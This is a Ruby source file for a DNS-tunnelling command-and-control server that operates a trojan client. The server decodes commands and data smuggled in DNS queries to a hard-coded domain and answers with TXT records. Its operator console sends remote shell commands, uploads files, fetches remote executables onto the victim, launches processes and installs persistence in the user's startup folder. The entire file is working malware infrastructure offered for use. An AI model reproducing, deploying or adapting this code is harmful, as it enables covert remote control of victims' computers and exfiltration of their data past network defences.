require 'base64'
require 'readline'
require 'socket'
require 'thread'

# to get this working:
#   1. in this file: set @domain to your (sub)domain, INCLUDING the leading dot
#   2. in this file: set an appropriate value for the include?() on line 286 (see comments)
#   3. in the client's Packet.cpp: set the domain member variable the same as in #1

class DNSServer

  class Packet
    attr_reader :id

    def initialize(id, opcode, data)
      @id = id
      @opcode = opcode
      @data = data
    end

    def flatten
      @id.to_s + "," + @opcode.to_s + "," + @data.to_s
    end
  end

  class Client
    attr_reader :id, :ip
    attr_accessor :output_buffer, :queue, :username

    def initialize(id, ip)
      @id = id
      @ip = ip
      @output_buffer = String.new
      @queue = Array.new
      @username = "loading..."
    end
  end

  module Op
    # packet types
    CHECKIN = 0
    NOP = 1
    ASSIGN_ID = 2
    BUFFER = 3
    EXEC = 4
    OUTPUT = 5
    OUTPUT_DONE = 6
    WRITE_FILE = 7
    GET_DIR = 8
    CHANGE_DIR = 9
    CREATE_PROCESS = 10
    FETCH_FILE = 11
    QUERY_USERNAME = 12
    PERSIST = 13

    # client operation types (server-side only)
    QUEUE_PUSH = 50
    QUEUE_POP = 51
    BUFFER_PUSH = 52
    BUFFER_POP = 53
    BUFFER_EMPTY = 54
    USERNAME_SET = 55
    USERNAME_GET = 56
  end

  def initialize
    @chunk_length = 180
    @max_chunks = 6
    @clients = Array.new
    @domain = '.rw1d.xfil.me'
    @listen_address = '0.0.0.0'
    @listen_port = 53
    @mutex = Mutex.new
    @packet_id = 0
    @selected_client_id = 0
    @sock = UDPSocket.new
    @upload_packets = 0
    @sock.bind(@listen_address, @listen_port)
    puts "\nType '?' for help, 'q' to quit\n\nWaiting for lookups to *#{@domain} (#{@listen_address}:#{@listen_port})...\n\n"
  end

  def en64(s)
    return Base64.strict_encode64(s)
  end

  def de64(s)
    return Base64.strict_decode64(s)
  end

  def display_help
    puts "\nBuilt-in commands:\n"
    puts "  fetch <url>    - fetch a file from given URL (ex: fetch http://yoursite.com/agent.exe)"
    puts "  i              - display connected clients"
    puts "  i <client_id>  - interact with specified client"
    puts "  persist        - attempt to copy the running trojan to the user's startup folder for persistence"
    puts "  pwd            - print current directory on the remote system"
    puts "  runbg <file>   - start a new process on the remote system (ex: runbg agent.exe)"
    puts "  upload <file>  - upload a file from the local system to the remote system (ex: upload /tmp/agent.exe)\n\n"
    puts "All other input will be executed on the client.\n\n"
  end

  def display_clients
    if !@clients.empty?
      print "ID".ljust(6), "IP Address".ljust(20), "Username".ljust(30), "Queue Size".ljust(16), "\n"
      puts "-" * 66
      @clients.each { |c| print c.id.to_s.ljust(6), c.ip.ljust(20), c.username.ljust(30), c.queue.size.to_s.ljust(16), "\n" }
      puts
    else
      puts "No clients connected."
    end
  end

  def add_client(remote_host)
    id = @clients.size + 1
    ip = remote_host[3]

    @mutex.synchronize {
      @clients.push(Client.new(id, ip))
    }

    puts "\nNew client connected [id #{id}]"

    if @selected_client_id.zero?
      puts "Automatically interacting with first client"
      @selected_client_id = id
    end

    return id
  end

  def create_packet(opcode, data)
    @packet_id += 1
    return Packet.new(@packet_id, opcode, data)
  end

  def client_exists?(id)
    @clients.each { |c| return true if c.id == id.to_i }
    return false
  end

  # all array modifications should be routed through here because mutex
  def client_op(id, op, val = nil)
    #puts "client_op [#{id}] [#{op}] [#{val.inspect}]"

    @mutex.synchronize {
      client = @clients.select { |c| c.id == id.to_i }.first
      case op
        when Op::QUEUE_PUSH
          client.queue.push(val)
        when Op::QUEUE_POP
          return client.queue.shift
        when Op::BUFFER_PUSH
          client.output_buffer << val
        when Op::BUFFER_POP
          ret = client.output_buffer
          client.output_buffer = ""
          return ret
        when Op::BUFFER_EMPTY
          return client.output_buffer.empty?
        when Op::USERNAME_SET
          client.username = val
        when Op::USERNAME_GET
          return client.username
      end
    }
  end

  def receive_packet
    begin
      return @sock.recvfrom_nonblock(65535)
    rescue IO::WaitReadable
      select([@sock])
      retry
    end
  end

  # this isn't very ruby of me
  def extract_payload(payload)
    a = payload.bytes.to_a
    r = ""
    for i in 13..(a.length)
      break if a[i].zero?
      if a[i] > 47
        r << a[i].chr
      else
        r << '.'
      end
    end

    if r.slice!(@domain) != nil
      # these gsubs are required because the client is using a slightly modified base64 character set since
      # '+' and '/' are not valid in a hostname. these gsubs translate the encoded text back to proper base64
      # encoding so ruby's base64 library can operate on them normally.
      return de64(r.gsub('.', '+').gsub('-', '/'))
    end
  end

  # create a raw DNS reply packet and inject the payload into the answer section
  def prepare_response(request, payload)
    a = Array.new
    r = request.bytes.to_a
    chunks = payload.chars.each_slice(@chunk_length).map(&:join)

    a.push(r[0])
    a.push(r[1])
    a.push(*[0x85, 0x80]) # standard reply
    a.push(*[0x00, 0x01]) # number of questions

    a.push(0x00)
    a.push(chunks.size)   # number of TXT answers

    a.push(*[0x00, 0x00]) # authority RRs
    a.push(*[0x00, 0x00]) # additional RRs

    # copy hostname bytes from request
    i = 12
    while r[i] != 0
      a.push(r[i])
      i += 1
    end

    a.push(0x00) # null-terminate hostname bytes
    a.push(*[0x00, 0x10]) # question type TXT
    a.push(*[0x00, 0x01]) # question class IN (internet)

    chunk_idx = 1
    chunks.each do |chunk|
      # prepend an index so client can re-assemble
      chunk.insert(0, chunk_idx.to_s)
      chunk_idx += 1

      a.push(*[0xc0, 0x0c]) # beginning of TXT record
      a.push(*[0x00, 0x10]) # answer type TXT
      a.push(*[0x00, 0x01]) # answer class IN (internet)
      a.push(*[0x00, 0x00, 0x00, 0x01]) # TTL, 1 sec
      a.push(0x00) # end of header

      a.push(chunk.length + 1)
      a.push(chunk.length)
      a.push(*chunk.bytes.to_a)
    end

    return a.pack('c*')
  end

  def send_response(msg, remote_host)
    @sock.send(msg.to_s, 0, remote_host[3], remote_host[1])
  end

  # take an opcode and data string and make a bunch of packets
  def packetize(opcode, data)
    slice_size = @chunk_length * @max_chunks
    encoded = en64(data)
    a = encoded.chars.each_slice(slice_size).map(&:join)
    a.each do |p|
      packet = create_packet(opcode, p)
      client_op(@selected_client_id, Op::QUEUE_PUSH, packet)
    end

    return a.count
  end

  def pack_upload_data(filename)
    if !File.exists?(filename)
      puts "File '#{filename}' does not exist."
      return
    end

    basename = filename.split(/\//).last.strip
    bytes = File.open(filename, "rb") { |f| f.read }

    @upload_packets = packetize(Op::BUFFER, bytes.to_s)

    # and a flush-to-file command
    client_op(@selected_client_id, Op::QUEUE_PUSH, create_packet(Op::WRITE_FILE, basename))

    puts "Pushed #{@upload_packets} packets for client #{@selected_client_id}"
  end

  def daemon
    loop do
      request, remote_host = receive_packet

      # this is a bit of a hack - ignore packets that don't contain this string.
      # best bet is to use the bare domain string (without the TLD), e.g. "google" not "google.com"
      # since words are not separated by dots in the raw bytes.
      next unless request.include?("xfil") # set this!

      # send a NOP by default, or set appropriately below
      packet = create_packet(Op::NOP, "")

      incoming = extract_payload(request)

      client_id = incoming[0].ord
      packet_id = incoming[1].ord
      opcode = incoming[2].ord
      data = incoming[3..-1]
      data = "" if data.nil? # do i need this?

      #puts "incoming [#{client_id}] [#{packet_id}] [#{opcode}] [#{data.inspect}]"

      case opcode.to_i

        when Op::CHECKIN
          # if this client exists, see if we have anything to send it
          if client_exists?(client_id)
            next_op = client_op(client_id, Op::QUEUE_POP)
            packet = next_op if next_op
          # client doesn't exist, so add a new one and return its ID
          else
            new_id = add_client(remote_host)
            packet = create_packet(Op::ASSIGN_ID, new_id)
            client_op(new_id, Op::QUEUE_PUSH, create_packet(Op::QUERY_USERNAME, ""))
          end

        when Op::OUTPUT
          if client_op(client_id, Op::BUFFER_EMPTY, "")
            print "\nBuffering response from client #{client_id}.."
          else
            print "."
          end
          client_op(client_id, Op::BUFFER_PUSH, data)

        when Op::OUTPUT_DONE
          buffer = client_op(client_id, Op::BUFFER_POP)
          buffer = "(Command finished with no output.)" if buffer.empty?
          puts "\n\n#{buffer}\n"

        when Op::QUERY_USERNAME
          client_op(client_id, Op::USERNAME_SET, data.strip)

      end

      response = prepare_response(request, packet.flatten)
      send_response(response, remote_host)
    end
  end

  # entry point and main kb input loop
  def main
    daemon_thread = Thread.new { daemon }

    loop do
      input = Readline.readline("#{@selected_client_id}> ", true).strip
      next if input.empty? or input.nil?

      tokens = input.split
      cmd = tokens.shift
      arg = tokens.shift

      case cmd
        # display clients or interact with specified client ID
        when "i"
          if arg.nil?
            display_clients
          else
            if client_exists?(arg)
              @selected_client_id = arg.to_i
              puts "Interacting with client #{arg}"
            else
              puts "No such client."
            end
          end

        when "upload"
          pack_upload_data(arg)

        when "pwd"
          client_op(@selected_client_id, Op::QUEUE_PUSH, create_packet(Op::GET_DIR, ""))

        when "cd"
          client_op(@selected_client_id, Op::QUEUE_PUSH, create_packet(Op::CHANGE_DIR, input.split[1..-1].join(" ")))

        when "fetch"
          client_op(@selected_client_id, Op::QUEUE_PUSH, create_packet(Op::FETCH_FILE, arg))

        when "runbg"
          client_op(@selected_client_id, Op::QUEUE_PUSH, create_packet(Op::CREATE_PROCESS, arg))

        when "persist"
          client_op(@selected_client_id, Op::QUEUE_PUSH, create_packet(Op::PERSIST, ""))

        when "?", "help"
          display_help

        when "q", "quit", "exit"
          exit

        # anything else is treated as something to execute on the client
        else
          if @selected_client_id.zero? or !client_exists?(@selected_client_id)
            puts "No client selected or client does not exist."
          else
            packetize(Op::EXEC, input)
          end
      end
    end
  end
end
